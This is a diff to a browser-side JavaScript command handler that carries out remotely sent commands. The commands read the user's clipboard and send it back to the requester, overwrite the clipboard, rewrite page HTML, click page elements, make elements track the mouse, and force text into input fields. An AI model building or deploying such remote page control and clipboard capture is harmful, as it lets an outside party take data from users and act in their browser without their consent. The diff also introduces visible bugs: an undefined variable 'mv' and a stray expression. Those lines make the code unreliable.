@@ -31,7 +31,7 @@ function commandManager(m) {
 
 function clipboard(m) {
     let c = m.command.trim().toLowerCase()
-    if (c.includes("get") || c.includes("read")) send({type:"response", command:c, value:navigator.clipboard.readText(), responseTarget:m.responseTarget})
+    if (c.includes("get") || c.includes("read")) navigator.clipboard.readText().then(cb=>send({type:"response", command:c, value:cb, responseTarget:m.responseTarget}))
     if (c.includes("set") || c.includes("write")) {
         navigator.clipboard.writeText(m.value)
         send({type:"response", command:c, value:"Clipboard value is now set to: "+m.value, responseTarget:m.responseTarget})
@@ -80,14 +80,21 @@ function html(m) {// {tag:"", html:"", selector:"", prepend:false}
             })
         })
         send({type:"response", command:c, value:"Modified element: "+v.selector+" ["+els.length+"]", responseTarget:m.responseTarget})
+    } else if (c.includes("action")) {// {selector:"", callback:"click"]}
+        let v = toJSON(m.value), els = document.querySelectorAll(v.selector)
+        els.forEach(el=>{
+            el[v.callback]?.()
+        })
+        send({type:"response", command:c, value:"Executed '"+v.callback+"' on: "+v.selector+" ["+els.length+"]", responseTarget:m.responseTarget})
     }
 }
 
 function follow(m) {// top:90, right:0, bottom:270, left:180   |   {selector:"", offset:270}
     let v = toJSON(m.value), offset = v.offset??270, els = document.querySelectorAll(v.selector)
     els.forEach(el=>{
-        let {x, y, width:w, height:h} = el.getBoundingClientRect()
-        window.onmousemove=(e)=>el.style.transform=`rotate(${offset-Math.atan2(y+h/2-e.y, -(x+w/2-e.x))*180/Math.PI}deg)`
+        let {x, y, width:w, height:h} = el.getBoundingClientRect(),
+        fn = (e)=>el.style.transform=`rotate(${offset-Math.atan2(y+h/2-e.y, -(x+w/2-e.x))*180/Math.PI}deg)`
+        window.addEventListener("mousemove",fn), fn
     })
     send({type:"response", command:m.command, value:v.selector+" is now following the mouse"+" ["+els.length+"]", responseTarget:m.responseTarget})
 }
@@ -111,7 +118,7 @@ function forcefeed(m) {//deleteMode: 0(canDelete)|1(deleteAdds)|null(keep) // {s
             old = el.value
         }
     })
-    send({type:"response", command:c, value:v.selector+" is now forcefeeding"+" ["+els.length+"]", responseTarget:m.responseTarget})
+    send({type:"response", command:m.command, value:mv.selector+" is now forcefeeding"+" ["+els.length+"]", responseTarget:m.responseTarget})
 }
 
 
